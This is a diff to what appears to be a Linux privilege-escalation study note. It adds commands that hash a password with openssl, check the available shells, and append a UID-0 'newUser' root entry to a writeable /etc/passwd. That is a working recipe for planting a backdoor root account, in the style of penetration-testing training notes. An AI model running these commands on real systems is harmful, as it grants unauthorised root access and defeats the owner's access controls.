@@ -105,7 +105,7 @@ Reverse the server setup and transfer the enum.txt to the attacking device for a
   
 ## Authentication Bypass  
 
-### SUID/GUID 
+### SUID/GUID  
 
 ### Writeable /etc/passwd files  
 
@@ -116,9 +116,24 @@ Reverse the server setup and transfer the enum.txt to the attacking device for a
 #### Generate compliant password hash
 
 
-`:> openssl-passwd -1 -salt [salt] [password]`  
+`:> openssl passwd -1 -salt [salt] [password]`  
 
-``
+![Generate hash](assets/Linux-PrivEsc-06-AuthBypass-01.png)  
+
+#### Identify shell options  
+
+`:> cat /etc/shells`  
+
+![Available Shells](assets/Linux-PrivEsc-06-AuthBypass-02.png)  
+
+#### Generate the new passwd file entry for a user that will be root
+
+`newUser:$1$new$3ykGuNYx735jO.yNvOciB0:0:0:root:/root:/bin/bash`
+
+#### Append the entry to /etc/passwd
+
+`:> echo 'newUser:$1$new$3ykGuNYx735jO.yNvOciB0:0:0:root:/root:/bin/bash' >> /etc/passwd`
+
 ## Escaping the Vi editor
 
 ## Exploit Crontab
